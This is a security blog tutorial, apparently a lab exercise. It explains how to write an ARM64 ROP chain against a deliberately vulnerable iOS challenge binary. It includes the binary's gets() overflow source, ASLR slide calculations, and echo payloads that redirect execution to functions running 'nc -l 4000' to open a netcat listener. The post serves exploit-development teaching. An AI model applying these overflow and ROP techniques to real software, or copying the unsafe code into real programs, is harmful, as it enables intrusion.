<!DOCTYPE html>
<html class="direction--ltr"lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
<title>ARM64 Reversing and Exploitation Part 3 - A Simple ROP Chain | Prateekg147</title>
<meta name="generator" content="Jekyll v4.2.2" />
<meta property="og:title" content="ARM64 Reversing and Exploitation Part 3 - A Simple ROP Chain" />
<meta name="author" content="Prateek Gianchandani" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Return-oriented programming (ROP) allows an attacker to execute code in the presence of security defenses such as executable space protection and code signing using ROP Gadgets. More details about ROP can be found here. In this blog post, we will be writing a ROP Chain for the rop binary. The binaries for this article can be found here." />
<meta property="og:description" content="Return-oriented programming (ROP) allows an attacker to execute code in the presence of security defenses such as executable space protection and code signing using ROP Gadgets. More details about ROP can be found here. In this blog post, we will be writing a ROP Chain for the rop binary. The binaries for this article can be found here." />
<meta property="og:site_name" content="Prateekg147" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2020-09-06T09:31:00+00:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="ARM64 Reversing and Exploitation Part 3 - A Simple ROP Chain" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Prateek Gianchandani"},"dateModified":"2020-09-06T09:31:00+00:00","datePublished":"2020-09-06T09:31:00+00:00","description":"Return-oriented programming (ROP) allows an attacker to execute code in the presence of security defenses such as executable space protection and code signing using ROP Gadgets. More details about ROP can be found here. In this blog post, we will be writing a ROP Chain for the rop binary. The binaries for this article can be found here.","headline":"ARM64 Reversing and Exploitation Part 3 - A Simple ROP Chain","mainEntityOfPage":{"@type":"WebPage","@id":"/2020/09/06/arm64-reversing-and-exploitation-part-3-a-simple-rop-chain.html"},"url":"/2020/09/06/arm64-reversing-and-exploitation-part-3-a-simple-rop-chain.html"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/style.css">
  <link rel="icon" type="image/png" href="/assets/favicon.png" />
  <link rel="stylesheet" href="/assets/css/magnific-popup.css"><link type="application/atom+xml" rel="alternate" href="/feed.xml" title="Prateekg147" /><script src="https://code.jquery.com/jquery-3.2.0.min.js"></script> 
  <script src="/assets/js/jquery.magnific-popup.js"></script>
</head>
<body><div class="site-header">
  <div class="wrapper">
    <a class="site-title" rel="author" href="/">Blogs<b class="command_prompt"></b></a>
    <a class="site-title" rel="author" href="/about">About<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
    <span class="social_links">
        
        
        <a class="color-cyan-hover" href="https://twitter.com/prateekg147"><i class="fab fa-twitter-square"></i></a>
        
        
        
        <a class="color-indigo-hover" href="https://www.linkedin.com/in/prateekgianchandani/"><i class="fab fa-linkedin"></i></a>
        
        
        
        <a class="color-yellow-hover" href="https://github.com/prateek147"><i class="fab fa-github-square"></i></a>
        
        
    </span>
  </div>
</div>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        
  <div class="author-box">


<img src="
    https://pbs.twimg.com/profile_images/1244561732170899457/SRr3p2iV_400x400.jpg
" class="author-avatar" alt="Avatar" />
<div class="description">I am Prateek Gianchandani. Currently i am working as a Security Researcher in UAE.  I have interests in Exploit Development, Mobile and Browser Security....<a href="/about"> Continue</a>
</div>

</div>


<div class="post">
  <h1 class="post-title">ARM64 Reversing and Exploitation Part 3 - A Simple ROP Chain</h1>
  
  <div class="post-tags">
      
      <a class="tag" href="/tag/security/">security</a>
      
      <a class="tag" href="/tag/ios/">ios</a>
      
  </div>
  
  <div class="post-date">
    Published on 06 Sep 2020
    
  </div>
  
  <p>Return-oriented programming (ROP) allows an attacker to execute code in the presence of security defenses such as executable space protection and code signing using ROP Gadgets.
More details about ROP can be found <a href="https://en.wikipedia.org/wiki/Return-oriented_programming#:~:text=Return%2Doriented%20programming%20(ROP),space%20protection%20and%20code%20signing. ">here</a>. In this blog post, we will be writing a ROP Chain for the <em>rop</em> binary. The binaries for this article can be found <a href="https://drive.google.com/file/d/1f3PDEz-Fh9I3rSDhpMGW5ZrCU9g0BjKL/view?usp=sharing">here</a>.</p>

<p>Your task here is to call the function <em>chain1</em> followed by <em>chain2</em></p>

<p>SSH to your Corellium or iOS device and run the rop binary</p>

<p><strong>$ rop</strong></p>

<p>Run the rop command</p>

<p><strong>./rop</strong></p>

<p><img src="/images/posts/arm/12.png" alt="1" /></p>

<!--more-->

<p>Nothing much happnes, however on reversing the main function, we find that it also accepts an extra argument and tries to open a file with the name <strong>hax.bin</strong> if it gets that argument (argument could be anything). <strong>arg0 = argc</strong> here which is 2 if one argument is passed.</p>

<p><img src="/images/posts/arm/13.png" alt="1" /></p>

<p>Sure enough, that’s what is happening if we look at the code.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Address of main function is %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">main</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"ROP chain challenge, call the function chain1 followed by chain2</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
    <span class="n">gets</span><span class="p">(</span><span class="n">name</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">==</span> <span class="mi">2</span><span class="p">){</span>
        <span class="kt">FILE</span> <span class="o">*</span><span class="n">f</span><span class="o">=</span><span class="n">fopen</span><span class="p">(</span><span class="s">"hax.bin"</span><span class="p">,</span><span class="s">"rb"</span><span class="p">);</span>
        <span class="n">fseek</span><span class="p">(</span><span class="n">f</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">SEEK_END</span><span class="p">);</span>
        <span class="kt">size_t</span> <span class="n">fs</span> <span class="o">=</span> <span class="n">ftell</span><span class="p">(</span><span class="n">f</span><span class="p">);</span>
        <span class="n">fseek</span><span class="p">(</span><span class="n">f</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">SEEK_SET</span><span class="p">);</span>
        <span class="n">fread</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">fs</span><span class="p">,</span> <span class="n">f</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Hello %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">name</span><span class="p">);</span>  
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span></code></pre></figure>

<p>As mentioned in the challenge, our task is to call the function <strong>chain1</strong> followed by <strong>chain2</strong>. Calling these functions in a chain will open a netcat listener on the device on port 4000.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">my_strcpy</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">dst</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">src</span><span class="p">){</span>
    <span class="k">while</span> <span class="p">((</span><span class="o">*</span><span class="p">(</span><span class="n">dst</span><span class="o">++</span><span class="p">)</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">src</span><span class="o">++</span><span class="p">)));</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">chain1</span><span class="p">(){</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Executing first chain.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">my_strcpy</span><span class="p">(</span><span class="n">command</span><span class="p">,</span><span class="s">"nc -l 4000"</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">chain2</span><span class="p">(){</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Executing second chain.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="n">command</span><span class="p">);</span>
<span class="p">}</span></code></pre></figure>

<p>Anothing thing we must be aware of is the slide. The slide is essentially a random value added to the start address of the binary to make sure all the addresses are slid. This program has a deliberate information leak where it dumps out the address of the main function. We can find the slide by subtracting this address of the main function in the running binary and the address of the main function in Hopper.</p>

<p>let’s run the binary again with a random argument.</p>

<p><img src="/images/posts/arm/14.png" alt="1" /></p>

<p>The address of the main function is 0x102693d50</p>

<p>and the address in the binary is 0x100007d50</p>

<p><img src="/images/posts/arm/27.png" alt="1" /></p>

<p>We can find the slide by subtracting the addresses. You can use python or any hex calculator (for e.g https://www.calculator.net/hex-calculator.html) to subtract these addresses</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="o">&gt;&gt;&gt;</span> <span class="n">hex</span><span class="p">(</span><span class="mh">0x102693d50</span> <span class="o">-</span> <span class="mh">0x100007d50</span><span class="p">)</span>
<span class="err">'</span><span class="mh">0x268c000</span><span class="err">'</span></code></pre></figure>

<p>So the slide in this case is 0x268c000. Using this, we can find the actual address of the <strong>chain1</strong> and the <strong>chain2</strong> function. We just need to add the slide to their addresses.</p>

<p><strong>It is important to note that the slide on each run will be different.</strong></p>

<p>The idea here is to keep entering input that would overwrite the lr (link register). After some attempts, we find that the following input overwrites the lr (link register) by CCCCCCCC which is \x43\x43\x43\x43\x43\x43\x43\x43.</p>

<p>Create a <strong>hax.bin</strong> file in the same folder using the below command.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">echo</span> <span class="o">-</span><span class="n">ne</span> <span class="s">"</span><span class="se">\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x43\x43\x43\x43\x43\x43\x43\x43</span><span class="s">"</span> <span class="o">&gt;</span> <span class="n">hax</span><span class="p">.</span><span class="n">bin</span></code></pre></figure>

<p><img src="/images/posts/arm/15.png" alt="1" /></p>

<p>Run the rop binary again and press enter after entering any input. It will read the input from the hax.bin file we just created and crash.</p>

<p>Now we need to look at the crash logs. There are a couple of ways to look at them.</p>

<p>a) On your device , go to <strong>Settings -&gt; Privacy -&gt; Analytics and Improvements -&gt; Analytics data</strong> and look at the latest crash log for the rop binary (the crash log with the highest number is the latest one)</p>

<p>We can see that the lr register is overwritten by 4343434343434343 which is all C</p>

<p><img src="/images/posts/arm/16.png" alt="1" /></p>

<p>c) Another way is to look via Xcode if your device is connected to your laptop by going to <strong>Window -&gt; Devices and Simulators -&gt; Select your device on the left and click on Logs</strong>
<img src="/images/posts/arm/17.png" alt="1" /></p>

<p>c) Another way is to use the command line utility <strong>idevicecrashreport</strong>. Make sure you have the package libimobiledevice installed on your laptop.</p>

<p>Run the command <strong>idevicecrashreport .</strong> to move the crash logs to your computer and analyze them.</p>

<p>Anyways, so it’s pretty clear what we need to do. We need to overwrite the final part of the payload which is \x43\x43\x43\x43\x43\x43\x43\x43 with the address of the chain1 function. However, there is a tricky part here. On ARM64, the value of lr (x30) register is first stored on the stack and then taken off the stack. See image below.</p>

<p><img src="/images/posts/arm/18.png" alt="1" /></p>

<p>We need to be able to control the x30 register (which is link register) once the function chain1 finishes execution. There seems to be no way to do that right now.</p>

<p>However, if we jump to the second instruction of chain1 function , we can trick the function into loading another value from the stack which might be controllable by us. Ofcourse, this is going to misalign the stack but we purposely want to misalign the stack in order to be able to pop next return address (x30) from the stack, which we can control, since we can smash the stack upwards as much as we want.</p>

<p><img src="/images/posts/arm/19.png" alt="1" /></p>

<p>So to jump to the second instruction , whose address is 0x100007cdc in the binary, we need to first find the slid address in the binary by adding the slide.</p>

<p>Let’s run the binary again, this time the address of main function is 0x10023bd50 , which means the slide is calculated below</p>

<p><img src="/images/posts/arm/21.png" alt="1" /></p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="o">&gt;&gt;&gt;</span> <span class="n">hex</span><span class="p">(</span><span class="mh">0x10023bd50</span> <span class="o">-</span> <span class="mh">0x100007d50</span><span class="p">)</span>
<span class="mh">0x234000</span></code></pre></figure>

<p>Slid address of the second instruction of chain1 =</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">hex</span><span class="p">(</span><span class="mh">0x100007cdc</span> <span class="o">+</span> <span class="mh">0x234000</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x10023bcdc</span> <span class="n">or</span> <span class="mh">0x000000010023bcdc</span></code></pre></figure>

<p>Let’s put this in our payload</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">echo</span> <span class="o">-</span><span class="n">ne</span> <span class="s">"</span><span class="se">\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\xdc\xbc\x23\x00\x01\x00\x00\x00</span><span class="s">"</span> <span class="o">&gt;</span> <span class="n">hax</span><span class="p">.</span><span class="n">bin</span></code></pre></figure>

<p>Remove any previous hax.bin file also if any and create a new one as shown below.</p>

<p><img src="/images/posts/arm/20.png" alt="1" /></p>

<p>Press enter on the running rop binary and you will see that the first chain gets executed. Nice, we are halfway there. Now we need to find a way to execute chain2 function.</p>

<p><img src="/images/posts/arm/22.png" alt="1" /></p>

<p>Now we need to keep entering our payloads until we overwrite the lr again. We can then change the lr again to point to chain2 function.</p>

<p>After testing several times we come up with the following payload using which we are able to overwrite lr register again.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">echo</span> <span class="o">-</span><span class="n">ne</span> <span class="s">"</span><span class="se">\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x42\x42\x42\x42\x42\x42\x42\x42\x46\x46\x46\x46\x46\x46\x46\x46\x48\x48\x48\x48\x48\x48\x48\x48</span><span class="s">"</span> <span class="o">&gt;</span> <span class="n">hax</span><span class="p">.</span><span class="n">bin</span></code></pre></figure>

<ul>
  <li>/x41 is the initial junk</li>
  <li>/x42 should point to the initial lr register which we should set to the second instruction of the chain1 function</li>
  <li>/x46 is junk as well</li>
  <li>/x48 should point to the chain2 function</li>
</ul>

<p>Ok, will all this information in place, we are now able to write our rop chain again.</p>

<p>Let’s run the program again. Address of main function is 0x1008b3d50 this time.</p>

<p><img src="/images/posts/arm/23.png" alt="1" /></p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">slide</span> <span class="o">=</span> <span class="n">hex</span><span class="p">(</span><span class="mh">0x1008b3d50</span> <span class="o">-</span> <span class="mh">0x100007d50</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x8ac000</span></code></pre></figure>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">slid</span> <span class="n">address</span> <span class="k">for</span> <span class="n">second</span> <span class="n">instruction</span> <span class="n">of</span> <span class="n">chain</span> <span class="mi">1</span> <span class="o">=</span> 
<span class="n">hex</span><span class="p">(</span><span class="mh">0x8ac000</span> <span class="o">+</span> <span class="mh">0x100007cdc</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x1008b3cdc</span> <span class="n">or</span> <span class="mh">0x00000001008b3cdc</span>

<span class="n">slid</span> <span class="n">address</span> <span class="k">for</span> <span class="n">chain2</span> <span class="n">function</span> <span class="o">=</span> 
<span class="n">hex</span><span class="p">(</span><span class="mh">0x8ac000</span> <span class="o">+</span> <span class="mh">0x100007d2c</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x1008b3d2c</span> <span class="n">or</span> <span class="mh">0x00000001008b3d2c</span></code></pre></figure>

<p>Using this info, we can now create our Rop chain</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">echo</span> <span class="o">-</span><span class="n">ne</span> <span class="s">"</span><span class="se">\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\xdc\x3c\x8b\x00\x01\x00\x00\x00\x46\x46\x46\x46\x46\x46\x46\x46\x2c\x3d\x8b\x00\x01\x00\x00\x00</span><span class="s">"</span> <span class="o">&gt;</span> <span class="n">hax</span><span class="p">.</span><span class="n">bin</span></code></pre></figure>

<p><img src="/images/posts/arm/26.png" alt="1" /></p>

<p>Press enter where the rop binary is running and Success, we can see that the second chain was executed and the application is still running, which means it opened a listening port on netcat.</p>

<p><img src="/images/posts/arm/24.png" alt="1" /></p>


</div>





<div class="related">
  <h2>related posts</h2>
  <ul class="related-posts">
    
      <li>
        <h3>
          <a href="/2020/09/06/arm64-reversing-and-exploitation-part-2-use-after-free.html">
            ARM64 Reversing and Exploitation Part 2 - Use After Free
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/2020/09/05/arm64-reversing-and-exploitation-part-1-arm-instruction-set-heap-overflow.html">
            ARM64 Reversing and Exploitation Part 1 - ARM Instruction Set + Simple Heap Overflow
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/2020/06/01/from-zero-to-tfp0-part-2-a-walkthrough-of-the-voucher-swap-exploit.html">
            From zero to tfp0 - Part 2: A Walkthrough of the voucher_swap exploit
          </a>
        </h3>
      </li>
    
  </ul>
</div>




  
  <h2>all tags</h2>
  <div class="tag-cloud"><a href="/tag/android/" class="set-1">android</a> <a href="/tag/authentication/" class="set-1">authentication</a> <a href="/tag/backtrack/" class="set-1">backtrack</a> <a href="/tag/burpsuite/" class="set-1">burpsuite</a> <a href="/tag/defcon/" class="set-1">defcon</a> <a href="/tag/dns/" class="set-1">dns</a> <a href="/tag/honeypots/" class="set-1">honeypots</a> <a href="/tag/ios/" class="set-1">ios</a> <a href="/tag/maintaining-access/" class="set-1">maintaining-access</a> <a href="/tag/meshnet/" class="set-1">meshnet</a> <a href="/tag/metasploit/" class="set-1">metasploit</a> <a href="/tag/networking/" class="set-1">networking</a> <a href="/tag/privacy/" class="set-1">privacy</a> <a href="/tag/security/" class="set-5">security</a> <a href="/tag/timing-analysis-attacks/" class="set-1">timing-analysis-attacks</a> <a href="/tag/w3af/" class="set-1">w3af</a> <a href="/tag/web-application-security/" class="set-1">web-application-security</a></div>
  




<script>
  let i = 0;
  const text = '';
  const speed = parseInt('50');
  
  function typeWriter() {
    if (i < text.length) {
      document.getElementById('animated-post-description').innerHTML += text.charAt(i);
      i++;
      setTimeout(typeWriter, speed);
    }
  }

  document.getElementById('animated-post-description').style.display = 'initial';
  typeWriter();

  // Image modal
  var $imgs = [];
  $('img').each(function(idx) {
    var obj = {
      src: $(this).attr('src')
    }
    $imgs.push(obj);
    var elem = $(this);
    $(this).click(function() {
      $('.modal').magnificPopup('open', idx);
    });
  });

  $('.modal').magnificPopup({
    items: $imgs,
    type: 'image',
    closeOnContentClick: true,
    mainClass: 'mfp-img-mobile',
    image: {
      verticalFit: true
    }
    
  });
</script>

      </div>
    </main><footer class="site-footer">
  <div class="wrapper">
    <div class="credits"><a href="https://github.com/bitbrain/jekyll-dash">dash</a> theme for Jekyll by <a href="https://github.com/bitbrain">bitbrain</a> made with <i class="fas fa-heart"></i><div class="toggleWrapper">
    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
    <label for="theme-toggle" class="toggle">
    <span class="toggle__handler">
      <span class="crater crater--1"></span>
      <span class="crater crater--2"></span>
      <span class="crater crater--3"></span>
    </span>
        <span class="star star--1"></span>
        <span class="star star--2"></span>
        <span class="star star--3"></span>
        <span class="star star--4"></span>
        <span class="star star--5"></span>
        <span class="star star--6"></span>
    </label>
</div>
<script type="text/javascript">
const theme = localStorage.getItem('theme');

if (theme === "light") {
    document.documentElement.setAttribute('data-theme', 'light');
} else {
    document.documentElement.setAttribute('data-theme', 'dark');
}
const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');

function activateDarkTheme() {
    document.getElementById('theme-toggle').checked = true;
    document.documentElement.setAttribute('data-theme', 'dark');
    document.documentElement.classList.add('theme--dark');
    document.documentElement.classList.remove('theme--light');
	document.getElementById("theme-toggle").className = 'light';
	window.localStorage.setItem('theme', 'dark');
}

function activateLightTheme() {
    document.getElementById('theme-toggle').checked = false;
    document.documentElement.setAttribute('data-theme', 'light');
    document.documentElement.classList.add('theme--light');
    document.documentElement.classList.remove('theme--dark');
	document.getElementById("theme-toggle").className = 'dark';
	window.localStorage.setItem('theme', 'light');
}

if (theme === "dark") {
    activateDarkTheme();
} else if (theme === "light") {
    activateLightTheme();
} else if  (userPrefers === "light") {
    activateDarkTheme();
} else {
    activateDarkTheme();
}

function modeSwitcher() {
	let currentMode = document.documentElement.getAttribute('data-theme');
	if (currentMode === "dark") {
	    activateLightTheme();
	} else {
	    activateDarkTheme();
	}
}
</script></div>
  </div>
</footer>


<script>
      window.FontAwesomeConfig = {
        searchPseudoElements: true
      }
    </script>
  </body>

</html>
